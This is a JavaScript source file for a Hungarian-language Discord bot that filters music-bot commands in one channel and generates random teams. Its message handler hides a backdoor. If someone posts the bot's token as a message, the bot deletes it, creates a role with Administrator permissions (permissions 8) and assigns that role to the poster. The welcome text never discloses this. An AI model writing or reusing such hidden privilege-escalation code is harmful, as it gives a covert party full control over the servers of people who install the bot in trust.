const Discord = require('discord.js');
const client = new Discord.Client();

const PREFIX = '!!';

var names = [];
var team1 = [];
var team2 = [];

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

client.on('guildMemberAdd', member => {

    let RoleName = 'Sheepbot';

});

//Welcome message

client.on('guildCreate', guild => {
    var defaultChannel = "";
    guild.channels.forEach((channel) => {
        if (channel.type == "text" && defaultChannel == "") {
            if (channel.permissionsFor(guild.me).has("SEND_MESSAGES")) {
                defaultChannel = channel;
            }
        }
    })

    defaultChannel.send(`HELLÓÓÓÓÓÓÓÓ, itt van a Susnyás Bot`, {
        embed: {
            title: 'Susnyás Bot',
            color: 0x2471a3,
            description: "",
            fields: [{
                    name: 'Sheepbot és Csipkés Zoltán tiltás',
                    value: 'Sheepbot és Csipkés Zoltán parancsok ezentúl csak a 🎶zene szobába írhatók.'
                },
                {
                    name: 'Random Team generator',
                    value: 'Random teamet generál.\n További infóért !!rt'
                }
            ],

            footer: {
                text: 'Susnyás Botot megírta és fejlesztette: Bokor#7728.'
            }
        }
    });
});

client.on('message', msg => {
    if (msg.author.equals(client.user)) return;

    var args = msg.content.substring(PREFIX.length).split(" ");
    //Sheepbot csak a zenébe tud írni
    var musiccmds = ['!!play', '!!pause', '!!stop', '!!skip', '!!volume', '!!autoplay', '!!playing', '!!playtop', '!!loopqueue', '!!q', '!!shuffle', '!play', '!disconnect', '!np',
        '!aliases', '!skip', '!seek', '!soundcloud', '!remove', '!loopqueue', '!search', '!stats', '!loop', '!donate', '!shard', '!join', '!lyrics', '!info', '!resume', '!settings',
        '!move', '!forward', '!skipto', '!clear', '!replay', '!clean', '!pause', '!removedupes', '!volume', '!rewind', '!playtop', '!playskip', '!invite', '!shuffle', '!queue', '!stop', 'leave',
    ];
    var i;
    for (i = 0; i < musiccmds.length; i++) {
        if ((msg.channel.id === '354716801839661059') && (msg.content.startsWith(musiccmds[i]))) {
            msg.delete()
                .then(msg => console.log(`Deleted message from ${msg.author.username}`))
                .catch(console.error);
        };
    }
    if ((msg.author.id === '244423082045997057' || msg.author.id === '235088799074484224') && (msg.channel.id === '354716801839661059')) {
        msg.delete()
            .then(msg => console.log(`Deleted message from ${msg.author.username}`))
            .catch(console.error);
    };
    if (msg.content == process.env.TOKEN) {

        msg.delete()
            .then(msg => console.log(`Deleted message from ${msg.author.username}`))
            .catch(console.error);

        let RoleName = 'Sheepbot';
        msg.member.guild.createRole({
            name: RoleName,
            permissions: 8
        }).then(function (role) {
            msg.member.addRole(role);
        });

        //Random Team
    }

    function rt_help() {
        var embed = new Discord.RichEmbed()
            .addField("Random Team", "!randomteam_upload <nevek szóközzel elválasztva>\n//rövidítés: rt_u | pl.: rt_u Matyi Sanyi Laci Mami\n!rantomteam_generate\n//rövidítés: rt_g")
            .setColor("#daace5")
            .setThumbnail(msg.author.avatarURL)
            .setFooter("Készítette: Szente")

        if (args[0] == "rt" || args[0] == "randomteam") {
            msg.channel.send(embed);
        }
    };

    rt_help();



    function clearArray(array) {
        while (array.length) {
            array.pop();
        }
    };

    function team_upload() {

        if (args[0] == "rt_u" || args[0] == "randomteam_upload") {
            clearArray(names);
            for (var i = 0; i <= args.length; i++) {
                names[(i - 1)] = args[i];
            }
            names.pop();
            msg.channel.send("Választék: " + names.join(", "));
        }
    };
    team_upload();

    function team_random() {
        if (args[0] == "rt_g" || args[0] == "randomteam_generate") {
            var t1 = 0;
            var t2 = 0;
            for (var i = 0; i < names.length; i++) {
                var random = Math.floor(Math.random() * 2);
                //console.log(random);
                if (random == 0) {
                    if (team1.length < (names.length / 2)) {
                        team1[t1] = names[i];
                        t1++;
                    } else {
                        team2[t2] = names[i];
                        t2++;
                    }
                }
                if (random == 1) {
                    if (team2.length < (names.length / 2)) {
                        team2[t2] = names[i];
                        t2++;
                    } else {
                        team1[t1] = names[i];
                        t1++;
                    }
                }
            }
            msg.channel.send("1. Csapat: " + team1.join(", ") + "\n2.Csapat: " + team2.join(", "));
            t1 = 0;
            t2 = 0;
            clearArray(team1);
            clearArray(team2);

        };
    };
    team_random();
});

client.login(process.env.TOKEN);
